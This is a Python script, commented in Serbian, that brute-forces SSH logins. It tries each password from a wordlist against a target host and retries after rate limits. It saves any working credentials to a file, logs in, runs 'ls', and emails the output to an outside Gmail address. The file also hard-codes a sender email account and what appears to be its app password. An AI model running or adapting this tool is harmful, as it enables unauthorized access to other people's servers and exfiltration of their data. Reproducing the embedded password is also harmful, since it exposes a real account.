import paramiko
import socket
import time
import smtplib, ssl
from colorama import init, Fore
from smtplib import SMTPException
#Colorama za interfejs s bojama
init()
GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET
BLUE = Fore.BLUE

#Funkcija koja nam govori da li je kombinacija tacna
def is_ssh_open(hostname, username, password):

    #inicijalizujemo ssh klijent
    client = paramiko.SSHClient()
    #Polisa koja automatski dodaje hostname i novi host key u lokalne host keyeve i cuva ih
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    #try pokusa blok koda, ako ima greska hvatamo je sa except, a ako nema gresaka ulazimo u else deo, finally je deo koda koji se uvek izvrsi
    try:
        #Pokusavamo da se povezemo sa timeoutom od 3 sekunde
        #client.connect(hostname = hostname, username = username, password = password, port = 2222, timeout = 3)
        client.connect(hostname = hostname, username = username, password = password, timeout = 3)

    except socket.timeout:
        #Ovde smo ako je host unreachable u te 3 sekunde
        print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")   #sa f ukazujemo na tip formatiranja stringa, tako da su vrednosti u { } zamenjene posle
        return False
    except paramiko.AuthenticationException:
        #Ovde smo ako smo promasili sifru
        print(f"[!] Sifra nije tacna {username}:{password}")
        return False
    except paramiko.SSHException:
        #Baci exception ako smo previse puta probali da se povezemo, drugim recima skonta da brut forsujemo
        print(f"{BLUE}[*] Predjen limit, ponovo pokusavam za minut...{RESET}")
        time.sleep(60)
        return is_ssh_open(hostname,username,password)
    else:
        #Konekcija uspela
        print(f"{GREEN}[+] Pronadjena kombinacija:\n\tHOSTNAME: {hostname}\n\tUSERNAME : {username}\n\tPASSOWRD: {password}{RESET}")
        return True

#__name__ proverava da li je ovo glavn skripta ili importovana, ako pokrecemo direktno ovu skriptu __name__ ce biti main a inace ce biti recimo __import__
if __name__ == "__main__":
    import argparse

    #Posto pozivam program u komandnoj liniji --p pre necega oznacava da je to pasvord, --u da je username a ako ne ukucam nista onda je to host
    #Nakon toga smestamo parsirane argumente u promenljive host,passlist,user
    parser = argparse.ArgumentParser(description="SSH Bruteforce Python script.")
    parser.add_argument("host", help="Hostname or IP adress of ssh server to bruteforce.")
    parser.add_argument("-p", "--passlist", help = "File that contain password list in each line.")
    parser.add_argument("-u", "--user", help = "Hostname username.")

    #Parsiramo dodate argumente
    args = parser.parse_args()
    host = args.host
    passlist = args.passlist #naziv fajla sa pasvordima
    user = args.user

    #Citaj fajl
    passlist = open(passlist).read().splitlines()

    #brutfors
    passFound = False
    for password in passlist:
        if is_ssh_open(host,user,password):
            #combo je validan, upisi ga u credentials.txt
            open("credentials.txt","w").write(f"{user}@{host}:{password}")
            passFound = True
            break
    
    #Konekcija
    if(passFound == True):
    	client = paramiko.client.SSHClient()
    	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    	client.connect(host, username = user, password = password)

    #Dobijanje outputa komande
    	client.exec_command("cd /Users/{user}")
    	stdin, stdout, stderr = client.exec_command("ls")
    	print("SSH Uspesan, zatvaram konekciju")
    	stdout = stdout.readlines()
    	client.close()

    	output = ""
    	for line in stdout:
    		output = output+line
    	if output!="":
    		#Slanje mejla
    		server = 'smtp.gmail.com'
    		sender = 'praksaggnikola@gmail.com'
    		receiver = 'nikolasehovac@gmail.com'
    		passw = 'zgrf utzx uyhs npvz'
    		
    		port = 465
    		
    		try:
	    		context = ssl.create_default_context()
	    		service = smtplib.SMTP_SSL(server,port,context = context)
	    		service.login(sender, passw)
    			service.sendmail(sender,receiver,output)
    			print("Mail je poslat")
    		except SMTPException:
    			print("Mejl nije poslat")	
    		
    	else:
    		print("Nije bilo outputa")
    
    else:
    	print(f"Sifra nije pronadjena")


